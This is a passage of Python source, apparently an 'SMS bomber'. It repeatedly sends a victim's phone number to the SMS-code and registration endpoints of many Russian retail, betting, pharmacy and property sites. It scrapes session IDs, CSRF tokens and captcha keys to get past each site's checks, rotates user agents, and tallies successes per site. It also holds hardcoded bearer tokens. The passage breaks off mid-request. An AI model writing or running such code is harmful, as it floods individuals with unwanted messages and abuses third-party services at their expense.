						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'X-Requested-With': 'XMLHttpRequest'
					},
				data = {
					'phone_number': phone,
					'TOKEN'+name_token: value_token,
					'_submitKey': submitkey
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("salampay " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.post("https://www.gulliver.ru/api/authorization/phone/token",
				headers = {
						'Accept': 'application/json, text/plain, */*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Host': 'www.gulliver.ru',
						'Origin': 'https://www.gulliver.ru',
						'Referer': 'https://www.gulliver.ru/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-origin',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			
			response = session.post("https://www.gulliver.ru/api/registration/phone/code_request",
				headers = {
						'Accept': 'application/json, text/plain, */*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Content-Type': 'application/json',
						'Host': 'www.gulliver.ru',
						'Origin': 'https://www.gulliver.ru',
						'Referer': 'https://www.gulliver.ru/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-origin',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {
					"name":"Афывыфв",
					"sex":"male",
					"email":"dsagsag@gmail.com",
					"phone": phone2,
					"birthdate":"24-08-2000",
					"password":"123123123Aa",
					"password_repeat":"123123123Aa",
					"has_email_subscription":"on",
					"agree_with_new_loyalty":"on",
					"token":"834691766bc8e49ce23d8fc9965866d0f8c70124ce52891a4fd173e0413f7609834691766bc8e49ce23d8fc9965866d0834691766bc8e49ce23d8fc9965866d0f8c70124ce52891a4fd173e0413f7609834691766bc8e49ce23d8fc9965866d0f8c70124ce52891a4fd173e0413f7609834691766bc8e49ce23d8fc9965866d0834691766bc8e49ce23d8fc9965866d0f8c70124ce52891a4fd173e0413f7609834691766bc8e49ce23d8fc9965866d0f8c70124ce52891a4fd173e0413f7609834691766bc8e49ce23d8fc9965866d0f8c70124ce52891a4fd173e0413f7609834691766bc8e49ce23d8fc9965866d0"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print("Guliver ошибка!")
			bad += 1
			bads += 1
	print("guliver " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://spb.uteka.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'none',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			response = session.post("https://spb.uteka.ru/rpc/?method=auth.GetCode",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/json',
						'origin': 'https://spb.uteka.ru',
						'platform': 'Desktop',
						'referer': 'https://spb.uteka.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'version': '358d00c6'
					},
				json = {
					"jsonrpc":"2.0",
					"id":12,
					"method":"auth.GetCode",
					"params":{"phone":phone1,"mustExist":False,"sendRealSms":True}
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("uteka " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://betboom.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'max-age=0',
						'referer': 'https://yandex.ru/',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'same-origin',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			response = session.post("https://siteapi.betboom.ru/api/site_api/v1/captcha/get",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/json;charset=UTF-8',
						'origin': 'https://betboom.ru',
						'platform': 'web',
						'referer': 'https://betboom.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-site',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {
					"type":"register"
				}
			)
			captcha = re.search('"captcha_key":"(.+?)"', response.text).group(1)

			response = session.post("https://siteapi.betboom.ru/api/site_api/v1/register/start",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/json;charset=UTF-8',
						'origin': 'https://betboom.ru',
						'referer': 'https://betboom.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-site',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {
					"phone":phone,
					"password":"123123123",
					"birth_date":"2000-03-15",
					"fingerprint":"0aee844247fa0bcd0efe87912a45b99e",
					"confirm_info":1,
					"captcha_key":captcha
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("betboom " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()

			response = session.get("https://www.fon.bet/account/registration/",
				headers = {
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Cache-Control': 'max-age=0',
						'Connection': 'keep-alive',
						'Host': 'www.fon.bet',
						'Referer': 'https://yandex.ru/',
						'Sec-Fetch-Mode': 'navigate',
						'Sec-Fetch-Site': 'same-origin',
						'Sec-Fetch-User': '?1',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			
			response = session.post("https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess",
				headers = {
						'Accept': '*/*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Content-Type': 'text/plain;charset=UTF-8',
						'Host': 'clientsapi03w.bk6bba-resources.com',
						'Origin': 'https://www.fon.bet',
						'Referer': 'https://www.fon.bet/account/registration/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'cross-site',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {
				"fio":"",
				"password":"123123123AsdA",
				"email":"",
				"emailAdvertAccepted":True,
				"phoneNumber":phone_plus,
				"webReferrer":"https://yandex.ru/",
				"advertInfo":"",
				"platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84",
				"promoId":"",
				"ecupis":True,
				"birthday":"2000-02-14",
				"sysId":1,
				"lang":"ru",
				"deviceId":"AD0C2B8D8DF339FBC78306BA0A5C2A23"	
				}
			)
			processid = re.search('"processId":"(.+?)"', response.text).group(1)

			response = session.post("https://clientsapi02w.bk6bba-resources.com/cps/superRegistration/resendSMS",
				headers = {
						'Accept': '*/*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Content-Type': 'text/plain;charset=UTF-8',
						'Host': 'clientsapi02w.bk6bba-resources.com',
						'Origin': 'https://www.fon.bet',
						'Referer': 'https://www.fon.bet/account/registration/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'cross-site',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {
					"processId": processid,
					"lang": "ru",
					"deviceId": "AD0C2B8D8DF339FBC78306BA0A5C2A23"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("fonbet " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://4k-monitor.ru/local/lib/register.php",	
				headers = {
						'accept': 'application/json, text/javascript, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'origin': 'https://4k-monitor.ru',
						'referer': 'https://4k-monitor.ru/login/?forgot_password=yes',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"bid_register_type" : (None, "registerForm"),
					"bid_phone" : (None, phone2)
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("4k_monitor " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://re-store.ru/local/components/multisite/system.auth.sms/ajax.php",
				headers = {
						'Accept': '*/*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'Host': 're-store.ru',
						'Origin': 'https://re-store.ru',
						'Referer': 'https://re-store.ru/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-origin',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'X-Requested-With': 'XMLHttpRequest'
					},
				data = {
					"action": "code_sms",
					"PERSONAL_PHONE": phone2,
					"PERSONAL_EMAIL": ""
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("restore " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://galaxystore.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'none',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			sessid = re.search("window.sessid = '(.+?)'", response.text).group(1)
			response = session.post("https://galaxystore.ru/local/components/multisite/system.auth.sms/ajax.php",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://galaxystore.ru',
						'referer': 'https://galaxystore.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"action": "code_sms",
					"PERSONAL_PHONE": phone2,
					"PERSONAL_EMAIL": "",
					"sessid": sessid
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("galaxystore " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://zdesapteka.ru/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'max-age=0',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'none',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			bxajaxid = re.search('name="bxajaxid" id="bxajaxid_(.+?)_8BACKi"', response.text).group(1)
			response = session.post("https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs%3Amain.ajax.AuthActions.sendAuthCode",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'bx-ajax': 'true',
						'content-type': 'application/x-www-form-urlencoded',
						'origin': 'https://zdesapteka.ru',
						'referer': 'https://zdesapteka.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
					"userPhone": phone2,
					"checkWord": "TapR5B!94^6qN53KMYUtZ&J6{}{}",
					"SITE_ID": "s1",
					"sessid": bxajaxid
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("zdesapteka " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.post("https://n.pronto24.ru/api/api-client/init",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'origin': 'https://www.pronto24.ru',
						'referer': 'https://www.pronto24.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-site',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-thapl-domain': 'www.pronto24.ru'
					},
				data = {
					"timeZone" : (None, "Europe/Moscow"),
					"language" : (None, "ru-RU"),
					"device_type" : (None, "-1")
				}
			)
			token = re.search('"api_token":"(.+?)"', response.text).group(1)
			response = session.post("https://n.pronto24.ru/api/user/generate-password",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'origin': 'https://www.pronto24.ru',
						'referer': 'https://www.pronto24.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-site',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-thapl-apitoken': token,
						'x-thapl-domain': 'www.pronto24.ru'
					},
				data = {
					"phone" : (None, phone10),
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("pronto24 " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://api3.pomogatel.ru/accounts",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'client-details': 'web:desktop:windows:{version}:10',
						'content-type': 'application/json',
						'device': 'desktop',
						'origin': 'https://pomogatel.ru',
						'platform': 'web',
						'referer': 'https://pomogatel.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-site',
						'session-details': '70eaf8ab-64df-49c4-94a3-a6276adee011:677114da-8bf0-443c-bf0c-d23eaa9206d0',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'user-language': 'ru-RU'
					},
				json = {
					"address":"Москва, 2-я Владимирская, 41к1",
					"country":"Россия",
					"locality":"Москва",
					"street":"2-я Владимирская улица",
					"house":"41к1",
					"latitude":"55.751893",
					"longitude":"37.784776",
					"roleId":"2",
					"phoneNumber":phone1,
					"phoneNumberMasked":phone4,
					"type":"phone",
					"specializationId":"32"}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("pomogatel " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://avtosliv.ru/server/auth/sms.php",
				headers = {
						'accept': 'application/json, text/javascript, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'link': '/server/auth/sms.php',
						'liveinternet': '099a63e6cef6019b1d27fcd3064c6b7e',
						'origin': 'https://avtosliv.ru',
						'referer': 'https://avtosliv.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': faker.random_user_agent("pc"),
						'utc': '1663158560689',
						'x-requested-with': 'XMLHttpRequest',
						'yandex-metrika': '10f43f7eea791e23991ef54b46ca7a3e3420959a'
					},
				data = {
					"p": phone11
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("avtosliv " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://www.bigam.ru/api/v1/users/registration?currentCity=1968",
				headers = {
						'accept': 'application/json, text/plain, */*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOm51bGwsImF1ZCI6bnVsbCwiaWF0IjoxNjYzMTY0NzgzLCJuYmYiOjE2NjMxNjQ3ODMsImV4cCI6MTY2MzE2NjU4MywiZGF0YSI6eyJpZCI6MCwiYmFza2V0SWQiOjg3ODY4MDgsInJvbGUiOiJ1bmF1dGhvcml6ZWQiLCJncm91cHMiOltdfX0.kJbVTCoOYCmnXhHmPaLlfYrcNn7wJ65LV7nbMLnfj44',
						'origin': 'https://www.bigam.ru',
						'referer': 'https://www.bigam.ru/personal/registration/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
				"name" : (None, "asdad asdas"),
				"phone" : (None, phone),
				"password" : (None, "123123123"),
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("bigam " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://zu.ru/personal/?backurl=/",
				headers = {
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'referer': 'https://zu.ru/',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'same-origin',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			sessid = re.search('type="hidden" name="sessid" id="sessid" value="(.+?)"', response.text).group(1)
			response = session.post("https://zu.ru/local/templates/auth/ajax/auth/handler.php",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://zu.ru',
						'referer': 'https://zu.ru/personal/?backurl=/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
						'sessid': sessid,
						'PERSONAL_PHONE': phone2,
						'terms': 'on'
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("zaloguspeha " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://dg-home.ru/",
				headers={
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'cache-control': 'max-age=0',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-site': 'none',
						'sec-fetch-user': '?1',
						'upgrade-insecure-requests': '1',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
					}
			)
			sessid = re.search('name="sessid" id="sessid" value="(.+?)"', response.text).group(1)
			response = session.post("https://dg-home.ru/login/",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://dg-home.ru',
						'referer': 'https://dg-home.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-bitrix-csrf-token': sessid,
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"sessid": sessid,
					"TYPE": "auth",
					"PHONE": phone2,
					"auth_agree": "1"
				}
			)
			xs = re.search(" xs: '(.+?)'", response.text).group(1)
			response = session.post("https://dg-home.ru/local/components/dghome-new/sms.confirm/templates/.default/ajax.php",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://dg-home.ru',
						'referer': 'https://dg-home.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-bitrix-csrf-token': sessid,
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"action": "confirm_auth",
					"site": "s1",
					"bxs": sessid,
					"xs": xs
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("dg_home " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			device = "pc"
			response = requests.post("https://ud-api.cian.ru/validation-codes/v1/send-code/",
				headers = {
						'accept': '*/*',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/json',
						'origin': 'https://vladimir.cian.ru',
						'referer': 'https://vladimir.cian.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-site',
						'user-agent': faker.random_user_agent(device)
					},
				json = {
				"phone":phone_plus,
				"type":"authenticateCode"
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("cian " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://madyart.ru/local/aut.php",
				headers = {
						'accept': 'application/json, text/javascript, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://madyart.ru',
						'referer': 'https://madyart.ru/reg/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					'wct_reg_fio': 'dasdas',
					'wct_reg_fio2': 'dasdasd',
					'wct_reg_phone': phone2,
					'wct_reg_ch': 'Y',
					'wct_reg_1': '',
					'wct_reg_2': '',
					'wct_reg_3': '1',
					'USER_PHONE': '7',
					'USER_PHONE2': '',
					'LOGIN1': '1218',
					'LOGIN2': '1219',
					'wc_phone_psw': '123123123',
					'wc_phone_psw2': '123123123',
					'wct_reg_ch3': 'Y'
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("madyart " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			response = requests.post("https://ap.leomax.ru/siteapi/auth/authcode", 
				headers = {
						'Accept': 'application/json, text/plain, */*',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiOWRmN2M0Yy01YWM0LTQyMDQtODAwNy1jZDE3MGE1NzhlMDQiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNWE4M2VhMTktODAyZS00OThmLWFhNzgtYjgxZWYwNDc4Y2JlIiwiZGV2aWNlaWQiOiIwYWVlODQ0MjQ3ZmEwYmNkMGVmZTg3OTEyYTQ1Yjk5ZSIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjMxMTA1ODMsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.oZJjej1Szl7PyqCVFGpkU8S9u1y_oSwNdblq0P4rdKk',
						'Connection': 'keep-alive',
						'Content-Type': 'application/json',
						'Host': 'ap.leomax.ru',
